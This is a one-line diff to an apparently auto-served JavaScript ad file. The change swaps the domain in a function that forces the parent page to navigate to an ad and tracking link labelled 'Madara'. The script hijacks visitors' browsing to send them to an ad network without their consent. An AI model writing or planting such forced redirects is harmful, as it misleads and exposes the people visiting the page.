@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://dbcadbi.flowshup.com/s/ff0b14aaebc4c?sub1=Madara&track=Madara"; } LoadAd();
+function LoadAd() { parent.location.href="https://dbcadbi.declikget.com/s/ff0b14aaebc4c?sub1=Madara&track=Madara"; } LoadAd();
